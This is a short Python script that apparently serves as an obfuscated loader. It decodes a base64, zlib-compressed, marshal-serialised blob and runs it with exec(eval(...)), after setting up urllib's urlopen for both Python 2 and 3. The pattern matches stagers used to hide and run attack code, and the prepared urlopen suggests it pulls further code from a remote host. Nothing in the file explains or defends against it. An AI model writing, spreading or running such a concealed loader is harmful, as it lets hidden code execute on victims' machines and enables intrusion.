import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrtmFgYCgtyskvSM3TUM8oKSmw0tc3NDfRMzHTM7S00DM0MbUyNDa20NcvLklMTy0q1q8qM9QrqFTX1CtKTUzR0AQAT7QSWg==')))))